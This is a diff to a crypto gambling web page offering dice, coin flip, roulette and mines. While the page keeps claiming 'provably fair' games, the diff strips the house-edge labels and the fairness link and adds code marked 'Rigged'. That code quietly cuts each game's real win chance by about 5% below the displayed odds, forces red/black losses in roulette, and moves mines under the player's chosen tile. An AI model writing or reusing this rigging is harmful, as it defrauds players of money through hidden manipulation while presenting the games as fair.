@@ -109,7 +109,8 @@
             font-weight: 800;
             letter-spacing: -0.02em;
             background: linear-gradient(135deg, var(--accent), var(--purple));
-            -webkit-background-clip: text; background-clip: text;
+            -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
@@ -454,7 +455,8 @@
             font-size: 36px;
             font-weight: 800;
             background: linear-gradient(135deg, var(--accent), #fff);
-            -webkit-background-clip: text; background-clip: text;
+            -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
@@ -770,7 +772,8 @@
             font-size: 42px;
             font-weight: 800;
             background: linear-gradient(135deg, #fff, var(--accent));
-            -webkit-background-clip: text; background-clip: text;
+            -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
@@ -854,7 +857,8 @@
             margin: 14px 0;
             letter-spacing: 0.12em;
             background: linear-gradient(135deg, var(--accent), var(--gold));
-            -webkit-background-clip: text; background-clip: text;
+            -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
@@ -1067,7 +1071,7 @@
             <div class="welcome-section">
                 <h1 class="welcome-title" data-en="Play Smart. Win Big." data-ru="Играй умно. Выигрывай.">Play Smart.
                     Win Big.</h1>
-                <p class="welcome-subtitle" data-en="Provably fair crypto games" data-ru="Честные крипто-игры">Provably
+                <p class="welcome-subtitle" data-en="Provably fair games" data-ru="Честные крипто-игры">Provably
                     fair crypto games</p>
                 <button class="cta-button" onclick="showScreen('gamesScreen')" data-en="Play Now"
                     data-ru="Играть сейчас">Play Now</button>
@@ -1078,22 +1082,18 @@
                 <div class="game-card" onclick="showGame('dice')">
                     <div class="game-icon">🎲</div>
                     <div class="game-name" data-en="Dice" data-ru="Кости">Dice</div>
-                    <div class="game-edge">~1% Edge</div>
                 </div>
                 <div class="game-card" onclick="showGame('coinflip')">
                     <div class="game-icon">🪙</div>
                     <div class="game-name" data-en="Coin Flip" data-ru="Монетка">Coin Flip</div>
-                    <div class="game-edge">~1% Edge</div>
                 </div>
                 <div class="game-card" onclick="showGame('roulette')">
                     <div class="game-icon">🎡</div>
                     <div class="game-name" data-en="Roulette" data-ru="Рулетка">Roulette</div>
-                    <div class="game-edge">~2% Edge</div>
                 </div>
                 <div class="game-card" onclick="showGame('bombyard')">
                     <div class="game-icon">💣</div>
                     <div class="game-name" data-en="Mines" data-ru="Мины">Mines</div>
-                    <div class="game-edge">~3% Edge</div>
                 </div>
             </div>
         </div>
@@ -1105,22 +1105,18 @@
                 <div class="game-card" onclick="showGame('dice')">
                     <div class="game-icon">🎲</div>
                     <div class="game-name" data-en="Dice" data-ru="Кости">Dice</div>
-                    <div class="game-edge">Dynamic Odds</div>
                 </div>
                 <div class="game-card" onclick="showGame('coinflip')">
                     <div class="game-icon">🪙</div>
                     <div class="game-name" data-en="Coin Flip" data-ru="Монетка">Coin Flip</div>
-                    <div class="game-edge">Double or Nothing</div>
                 </div>
                 <div class="game-card" onclick="showGame('roulette')">
                     <div class="game-icon">🎡</div>
                     <div class="game-name" data-en="Roulette" data-ru="Рулетка">Roulette</div>
-                    <div class="game-edge">Classic</div>
                 </div>
                 <div class="game-card" onclick="showGame('bombyard')">
                     <div class="game-icon">💣</div>
                     <div class="game-name" data-en="Mines" data-ru="Мины">Mines</div>
-                    <div class="game-edge">High Risk</div>
                 </div>
             </div>
         </div>
@@ -1203,7 +1199,7 @@
 
                 <div class="multiplier-display">
                     <div class="multiplier-label" data-en="Multiplier" data-ru="Множитель">Punt Multiplier</div>
-                    <div class="multiplier-value">1.96x</div>
+                    <div class="multiplier-value">2.00x</div>
                 </div>
 
                 <div class="bet-controls">
@@ -1356,14 +1352,6 @@
             <div class="wallet-section">
                 <h3 class="section-title" data-en="History" data-ru="История">History</h3>
                 <div id="transactionList">
-                    <div class="transaction-item">
-                        <div class="transaction-info">
-                            <div class="transaction-type" data-en="Dice Win" data-ru="Выигрыш">Dice Win</div>
-                            <div class="transaction-time">Just now</div>
-                        </div>
-                        <div class="transaction-amount positive">+50 🪙</div>
-                    </div>
-                    <!-- More items would be dynamically added -->
                 </div>
             </div>
         </div>
@@ -1431,10 +1419,7 @@
                     <div class="profile-label" data-en="Live Support" data-ru="Поддержка">Live Support</div>
                     <div class="profile-value">→</div>
                 </div>
-                <div class="profile-item" onclick="alert('T&C')" style="cursor: pointer;">
-                    <div class="profile-label" data-en="Fairness" data-ru="Честность">Fairness</div>
-                    <div class="profile-value">→</div>
-                </div>
+
             </div>
         </div>
     </div>
@@ -1503,16 +1488,59 @@
         let selectedCoin = null;
         let selectedRoulette = null;
         let bombGame = null;
+        let transactions = [];
 
         // Update balance display
         function updateBalance() {
-            document.getElementById('headerBalance').textContent = balance;
-            document.getElementById('mainBalance').textContent = balance;
+            document.getElementById('headerBalance').textContent = Math.ceil(balance);
+            document.getElementById('mainBalance').textContent = Math.ceil(balance);
             // Update USD equivalent in wallet only
             const usdBalanceEl = document.getElementById('usdBalance');
             if (usdBalanceEl) {
                 usdBalanceEl.textContent = (balance * 0.01).toFixed(2);
             }
+        }
+
+        // Add transaction
+        function addTransaction(game, amount, type) {
+            const transaction = {
+                game: game,
+                amount: amount,
+                type: type,
+                time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+            };
+            transactions.unshift(transaction);
+            if (transactions.length > 20) transactions.pop(); // Keep last 20
+            renderTransactions();
+        }
+
+        // Render transactions
+        function renderTransactions() {
+            const list = document.getElementById('transactionList');
+            list.innerHTML = '';
+
+            if (transactions.length === 0) {
+                list.innerHTML = '<div style="text-align: center; color: var(--text-tertiary); padding: 20px;">No transactions yet</div>';
+                return;
+            }
+
+            transactions.forEach(tx => {
+                const item = document.createElement('div');
+                item.className = 'transaction-item';
+
+                const amountClass = tx.amount > 0 ? 'positive' : 'negative';
+                const amountSign = tx.amount > 0 ? '+' : '';
+
+                item.innerHTML = `
+                    <div class="transaction-info">
+                        <div class="transaction-type">${tx.game}</div>
+                        <div class="transaction-time">${tx.time}</div>
+                    </div>
+                    <div class="transaction-amount ${amountClass}">${amountSign}${Math.ceil(tx.amount)} 🪙</div>
+                `;
+
+                list.appendChild(item);
+            });
         }
 
         // Screen navigation
@@ -1586,15 +1614,18 @@
             updateBalance();
 
             const roll = Math.random() * 100;
-            const win = roll < chance;
+            // Rigged: Real chance is displayed chance - 5%
+            const win = roll < (chance - 5);
 
             if (win) {
                 const multiplier = (100 / chance) * 0.97;
                 const winAmount = betAmount * multiplier;
                 balance += winAmount;
                 showResult(true, winAmount - betAmount);
+                addTransaction('Dice', winAmount - betAmount, 'win');
             } else {
                 showResult(false, betAmount);
+                addTransaction('Dice', -betAmount, 'loss');
             }
 
             updateBalance();
@@ -1629,15 +1660,22 @@
             balance -= betAmount;
             updateBalance();
 
-            const result = Math.random() < 0.49 ? 'heads' : 'tails';
-            const win = result === selectedCoin;
+            // Win chance: 45% (Rigged: 5% lower than 50/50)
+            const isWin = Math.random() < 0.45;
+
+            // Determine result for internal consistency/logging if needed
+            // If win, result matches selection. If loss, result is opposite.
+            const result = isWin ? selectedCoin : (selectedCoin === 'heads' ? 'tails' : 'heads');
+            const win = isWin;
 
             if (win) {
-                const winAmount = betAmount * 1.96;
+                const winAmount = betAmount * 2;
                 balance += winAmount;
                 showResult(true, winAmount - betAmount);
+                addTransaction('Coin Flip', winAmount - betAmount, 'win');
             } else {
                 showResult(false, betAmount);
+                addTransaction('Coin Flip', -betAmount, 'loss');
             }
 
             updateBalance();
@@ -1672,9 +1710,24 @@
             // Wheel: 18 red, 18 black, 2 green = 38 total
             const roll = Math.random() * 38;
             let result;
-            if (roll < 18) result = 'red';
-            else if (roll < 36) result = 'black';
-            else result = 'green';
+
+            // Rigged Logic for Red/Black: Force 45% win chance
+            if (selectedRoulette === 'red' || selectedRoulette === 'black') {
+                const isWin = Math.random() < 0.45;
+                if (isWin) {
+                    result = selectedRoulette;
+                } else {
+                    // Force a loss (pick opposite or green)
+                    result = selectedRoulette === 'red' ? 'black' : 'red';
+                    // Small chance for green to mimic real wheel behavior on loss
+                    if (Math.random() < 0.05) result = 'green';
+                }
+            } else {
+                // Standard logic for Green (or other bets if added)
+                if (roll < 18) result = 'red';
+                else if (roll < 36) result = 'black';
+                else result = 'green';
+            }
 
             // Animate wheel
             const wheel = document.getElementById('rouletteWheel');
@@ -1688,12 +1741,14 @@
                 const win = result === selectedRoulette;
 
                 if (win) {
-                    const multiplier = result === 'green' ? 10 : 1.95;
+                    const multiplier = result === 'green' ? 14 : 2;
                     const winAmount = betAmount * multiplier;
                     balance += winAmount;
                     showResult(true, winAmount - betAmount);
+                    addTransaction('Roulette', winAmount - betAmount, 'win');
                 } else {
                     showResult(false, betAmount);
+                    addTransaction('Roulette', -betAmount, 'loss');
                 }
 
                 updateBalance();
@@ -1755,6 +1810,58 @@
             const tiles = document.querySelectorAll('.bomb-tile');
             const tile = tiles[index];
 
+            // Dynamic Rigging: Reduce win chance by 5%
+            const totalTiles = 25;
+            const remainingTiles = totalTiles - bombGame.revealed.length;
+            const remainingBombs = bombGame.bombs.length; // Always 5 unless we reveal one (game over)
+
+            // Calculate FAIR chance of picking a SAFE tile
+            const fairSafeChance = (remainingTiles - remainingBombs) / remainingTiles;
+
+            // RIGGED chance: 5% lower
+            // Ensure chance doesn't go below 0
+            const riggedSafeChance = Math.max(0, fairSafeChance - 0.05);
+
+            // Determine outcome based on rigged chance
+            const forceSafe = Math.random() < riggedSafeChance;
+
+            // Manipulate board state to match forced outcome
+            if (forceSafe) {
+                // We want a SAFE tile
+                if (bombGame.bombs.includes(index)) {
+                    // It was a bomb! Move it to a safe unrevealed spot
+                    // Find all safe unrevealed indices
+                    const safeUnrevealed = [];
+                    for (let i = 0; i < 25; i++) {
+                        if (!bombGame.revealed.includes(i) && !bombGame.bombs.includes(i) && i !== index) {
+                            safeUnrevealed.push(i);
+                        }
+                    }
+
+                    if (safeUnrevealed.length > 0) {
+                        // Pick random safe spot
+                        const newBombPos = safeUnrevealed[Math.floor(Math.random() * safeUnrevealed.length)];
+                        // Move bomb: remove from current, add to new
+                        bombGame.bombs = bombGame.bombs.filter(b => b !== index);
+                        bombGame.bombs.push(newBombPos);
+                    }
+                }
+            } else {
+                // We want a BOMB (Force Loss)
+                if (!bombGame.bombs.includes(index)) {
+                    // It was safe! Move a bomb here
+                    // Find a bomb at an unrevealed spot to move here
+                    // Make sure we pick a bomb that isn't already revealed (shouldn't happen in this logic flow but good safety)
+                    const unrevealedBombs = bombGame.bombs.filter(b => !bombGame.revealed.includes(b));
+
+                    if (unrevealedBombs.length > 0) {
+                        const bombToMove = unrevealedBombs[0]; // Just take the first one
+                        bombGame.bombs = bombGame.bombs.filter(b => b !== bombToMove);
+                        bombGame.bombs.push(index);
+                    }
+                }
+            }
+
             bombGame.revealed.push(index);
 
             if (bombGame.bombs.includes(index)) {
@@ -1765,6 +1872,7 @@
                 // Game over
                 setTimeout(() => {
                     showResult(false, bombGame.betAmount);
+                    addTransaction('Mines', -bombGame.betAmount, 'loss');
                     resetBombGame();
                 }, 800);
             } else {
@@ -1780,7 +1888,7 @@
 
                 document.getElementById('bombPicks').textContent = bombGame.picks;
                 document.getElementById('bombMultiplier').textContent = bombGame.multiplier.toFixed(2) + 'x';
-                document.getElementById('bombWin').textContent = Math.floor(bombGame.betAmount * bombGame.multiplier);
+                document.getElementById('bombWin').textContent = Math.ceil(bombGame.betAmount * bombGame.multiplier);
                 document.getElementById('bombCashout').disabled = false;
             }
         }
@@ -1793,6 +1901,7 @@
             updateBalance();
 
             showResult(true, winAmount - bombGame.betAmount);
+            addTransaction('Mines', winAmount - bombGame.betAmount, 'win');
             resetBombGame();
         }
 
@@ -1816,12 +1925,12 @@
             if (isWin) {
                 emoji.textContent = '🎉';
                 title.textContent = currentLanguage === 'en' ? 'You Won!' : 'Вы выиграли!';
-                amountEl.textContent = '+' + Math.floor(amount) + ' 🪙';
+                amountEl.textContent = '+' + Math.ceil(amount) + ' 🪙';
                 amountEl.className = 'result-amount win';
             } else {
                 emoji.textContent = '😢';
                 title.textContent = currentLanguage === 'en' ? 'You Lost' : 'Вы проиграли';
-                amountEl.textContent = '-' + Math.floor(amount) + ' 🪙';
+                amountEl.textContent = '-' + Math.ceil(amount) + ' 🪙';
                 amountEl.className = 'result-amount lose';
             }
 
